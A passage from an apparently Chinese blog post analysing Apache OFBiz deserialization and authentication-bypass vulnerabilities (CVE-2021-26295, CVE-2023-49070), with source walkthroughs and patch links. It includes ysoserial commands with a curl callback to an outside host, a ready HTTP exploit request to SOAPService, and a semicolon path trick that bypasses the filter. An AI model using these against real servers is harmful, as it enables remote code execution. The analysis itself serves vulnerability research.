class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">           </span><span class="template-variable">&#123;&#123;<span class="name">Base64_Payload</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363405198-e9396643-7834-4ea4-9a77-2edb89417858.png"></p>
<p><font style="color:#000000;">官方第一次提交的修复补丁</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a"><font style="color:#000000;">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</font></a><font style="color:#000000;">，此次补丁的主要作用是为XML-RPC的接口进行鉴权。</font></p>
<p><font style="color:#000000;">但是这种修复方式治标不治本，攻击者依旧可以实现Post-Auth攻击，因此官方进行了二次补丁，此次增加了关键词</serializable>的检测。但是这样就安全了嘛？很明显，可以利用增加空格的方式来进行绕过，因此官方又进行了一次补丁</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/25293e4cf6f334a2ae33b3041acba45113dddce9"><font style="color:#000000;">https://github.com/apache/ofbiz-framework/commit/25293e4cf6f334a2ae33b3041acba45113dddce9</font></a><font style="color:#000000;">，通过检测&lt;&#x2F;serializable关键词来进行防御。</font></p>
<h3 id="CVE-2021-26295"><a href="#CVE-2021-26295" class="headerlink" title="CVE-2021-26295"></a><font style="color:rgb(0, 0, 0);">CVE-2021-26295</font></h3><p><font style="color:#000000;">在上文分析CVE-2020-9496时，在controller.xml文件中还存在另一个路由SOAPService，其鉴权也是缺失的。</font></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;SOAPService&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;soap&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">可以看到，SOAPService路由对应的event为soap，寻找对应的SOAP Event Handler。在org.apache.ofbiz.webapp.event.SOAPEventHandler#invoke方法中，会利用SoapSerializer#deserialize方法，将SOAP请求中的XML数据反序列化为Java对象。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">(Event event, RequestMap requestMap, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> EventHandlerException &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">String</span> <span class="variable">serviceName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SOAPBody</span> <span class="variable">reqBody</span> <span class="operator">=</span> reqEnv.getBody();</span><br><span class="line">        validateSOAPBody(reqBody);</span><br><span class="line">        <span class="type">OMElement</span> <span class="variable">serviceElement</span> <span class="operator">=</span> reqBody.getFirstElement();</span><br><span class="line">        serviceName = serviceElement.getLocalName();</span><br><span class="line">        Map&lt;String, Object&gt; parameters = UtilGenerics.cast(SoapSerializer.deserialize(serviceElement.toString(), delegator));</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        sendError(response, e.getMessage(), serviceName);</span><br><span class="line">        Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在org.apache.ofbiz.service.engine.SoapSerializer#deserialize方法中，会利用XmlSerializer#deserialize方法来将XML数据反序列化为Java对象。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String content, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException, SAXException, ParserConfigurationException, IOException &#123;</span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> UtilXml.readXmlDocument(content, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (document != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> XmlSerializer.deserialize(document, delegator);</span><br><span class="line">    &#125;</span><br><span class="line">    Debug.logWarning(<span class="string">&quot;Serialized document came back null&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在org.apache.ofbiz.entity.serialize.XmlSerializer#deserialize方法中，调用org.apache.ofbiz.entity.serialize.XmlSerializer#deserializeSingle方法，根据标签进行解析，接着进一步调用org.apache.ofbiz.entity.serialize.XmlSerializer#</font><font style="color:#000000;background-color:#ffffff;">deserializeCustom</font><font style="color:#000000;"> 方法。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(Document document, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">    <span class="comment">// find the first element below the root element, that should be the object</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">curChild</span> <span class="operator">=</span> rootElement.getFirstChild();</span><br><span class="line">    <span class="keyword">while</span> (curChild != <span class="literal">null</span> &amp;&amp; curChild.getNodeType() != Node.ELEMENT_NODE) &#123;</span><br><span class="line">        curChild = curChild.getNextSibling();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (curChild == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserializeSingle((Element) curChild, delegator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeSingle</span><span class="params">(Element element, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getLocalName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;null&quot;</span>.equals(tagName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializeCustom(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeCustom</span><span class="params">(Element element)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getLocalName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;cus-obj&quot;</span>.equals(tagName)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> UtilXml.elementValue(element);</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] valueBytes = StringUtil.fromHexString(value);</span><br><span class="line">            <span class="keyword">if</span> (valueBytes != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> UtilObject.getObject(valueBytes);</span><br><span class="line">                <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializeException</span>(<span class="string">&quot;Problem deserializing object from byte array + &quot;</span> + element.getLocalName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializeException</span>(<span class="string">&quot;Cannot deserialize element named &quot;</span> + element.getLocalName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<font style="color:#000000;">XmlSerializer#</font><font style="color:#000000;background-color:#ffffff;">deserializeCustom</font><font style="color:#000000;"> 方法中，当标签为cus-obj时，对内容进行一次十六进制解码处理，然后调用org.apache.ofbiz.base.util.UtilObject#getObject方法将字节数组反序列化为Java对象。UtilObject#getObject方法进一步调用UtilObject#getObjectException方法来反序列化字节数组数据，但是这里调用的是自定义的SafeObjectInputStream来处理数据。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = getObjectException(bytes);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">        Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectException</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">SafeObjectInputStream</span> <span class="variable">wois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis)) &#123;</span><br><span class="line">        <span class="keyword">return</span> wois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">跟进SafeObjectInputStream，可以看到采用了白名单来限制了反序列化的类，由于java..*的松散程度过大，导致了恶意反序列化的发生。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423006307-ef7649a9-4ed2-4507-83d7-8268c694fca9.png"></p>
<p><font style="color:#000000;">在官方补丁</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/af9ed4e">https://github.com/apache/ofbiz-framework/commit/af9ed4e</a><font style="color:#000000;">也可以看到，增加了对</font><font style="color:#000000;background-color:#ffffff;">java.rmi.server的反序列化限制。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423244554-ec57d8c5-7cb8-4885-9119-174aae0b1400.png"></p>
<p>漏洞利用数据包如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 <span class="string">&quot;curl http://192.168.0.115:4444&quot;</span></span><br><span class="line">java -jar ysoserial-all.jar JRMPClient <span class="string">&quot;192.168.0.115:1099&quot;</span> | xxd -p -c 10000000</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/SOAPService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>767</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">ser</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">cus-obj</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">payload</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">cus-obj</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">ser</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">官方补丁中采用黑名单的方式增加对java.rmi.server的限制，</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/af9ed4e#diff-c0e9a4bd325bc9530a752224575a9f3942e7cba19d61001836214c50d56aa9fcR72">https://github.com/apache/ofbiz-framework/commit/af9ed4e#diff-c0e9a4bd325bc9530a752224575a9f3942e7cba19d61001836214c50d56aa9fcR72</a>。</p>
<p><font style="color:#000000;">由于这种修复方式依旧没有解决白名单绕过的问题，r00t4dm师傅利用javax.management.remote.rmi.RMIConnectionImpl_Stub绕过了该补丁（CVE-2021-29200），参考</font><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9556?time__1311=n4+xnD0DuAeWqxYq40HpDUrOWDkC1DBBiKbrYD">Apache OFBiz CVE-2021-29200 简要分析</a><font style="color:#000000;">。</font></p>
<h2 id="Bypas-Auth"><a href="#Bypas-Auth" class="headerlink" title="Bypas Auth"></a><font style="color:#000000;">Bypas Auth</font></h2><h3 id="CVE-2023-49070"><a href="#CVE-2023-49070" class="headerlink" title="CVE-2023-49070"></a>CVE-2023-49070</h3><p><font style="color:#000000;">上文提到了，对于XMLRPC相关的漏洞增加了两个主要的修复方式，那如果想让漏洞重新变为一个Pre-Auth RCE漏洞，需要满足如下条件：</font></p>
<ol>
<li><strong><font style="color:#000000;">绕过对于&lt;&#x2F;serializable这个关键词的检测</font></strong></li>
<li><strong><font style="color:#000000;">绕过对XML-RPC这个接口的认证</font></strong></li>
</ol>
<p><font style="color:#000000;">上文已经知道了补丁的信息，增加了一个CacheFilter来进行防护，可以看到首先会匹配当前uri是否为&#x2F;control&#x2F;xmlrpc，如果路由符合的话会判断请求体中是否包含&lt;&#x2F;serializable关键词，匹配到了则进行拦截。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在Java中，部分中间件如Tomcat可以通过;的方式，在路径中增加Matrix Parameters来进行绕过，</font><a target="_blank" rel="noopener" href="https://www.baeldung.com/cs/url-matrix-vs-query-parameters">https://www.baeldung.com/cs/url-matrix-vs-query-parameters</a>。<font style="color:#000000;">尝试在XML-RPC请求的路径中增加分号&#x2F;webtools&#x2F;control&#x2F;xmlrpc;&#x2F;，可以看到此时uri已经变成&#x2F;control&#x2F;xmlrpc;&#x2F;，绕过了这里的限制。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734401953859-801c2846-16a4-4402-9fe2-2e81822a8aad.png"></p>
<p>此时绕过了对于&lt;&#x2F;serializable这个关键词的检测，可以看到服务器返回了登录界面，因此还需要绕过对XML-RPC这个接口的认证。</p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402182734-3a2957cb-b5fd-4f1d-88b1-7828e75a6a5f.png"></p>
<p><font style="color:#000000;">在org.apache.ofbiz.webapp.control.LoginWorker#checkLogin方法下断点，该函数用于检查用户是否登录。注意到一个关键的判断</font><strong><font style="color:#000000;">“username &#x3D;&#x3D; null || (password &#x3D;&#x3D; null &amp;&amp; token &#x3D;&#x3D; null) || “error”.equals(login(request, response)”</font></strong><font style="color:#000000;">，此时当username和password不为null，且login方法的返回值不为error即可绕过。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">checkLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">GenericValue</span> <span class="variable">userLogin</span> <span class="operator">=</span> checkLogout(request, response);</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userLogin == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// check parameters</span></span><br><span class="line">        username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">        password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">        token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line">        <span class="comment">// check session attributes</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// in this condition log them in if not already; if not logged in or can&#x27;t log in, save parameters and return error</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line">            request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line">            session.setAttribute(<span class="string">&quot;_PREVIOUS_REQUEST_&quot;</span>, request.getPathInfo());</span><br><span class="line">            Map&lt;String, Object&gt; urlParams = UtilHttp.getUrlOnlyParameterMap(request);</span><br><span class="line">            <span class="keyword">if</span> (UtilValidate.isNotEmpty(urlParams)) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_URL_&quot;</span>, urlParams);</span><br><span class="line">            &#125;</span><br><span class="line">            Map&lt;String, Object&gt; formParams = UtilHttp.getParameterMap(request, urlParams.keySet(), <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (UtilValidate.isNotEmpty(formParams)) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_FORM_&quot;</span>, formParams);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Allow loggingOut when impersonated</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLoggingOut</span> <span class="operator">=</span> <span class="string">&quot;logout&quot;</span>.equals(RequestHandler.getRequestUri(request.getPathInfo()));</span><br><span class="line">    <span class="comment">//Check if the user has an impersonation in process</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">authoriseLoginDuringImpersonate</span> <span class="operator">=</span> EntityUtilProperties.propertyValueEquals(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;security.login.authorised.during.impersonate&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!isLoggingOut &amp;&amp; !authoriseLoginDuringImpersonate &amp;&amp; checkImpersonationInProcess(request, 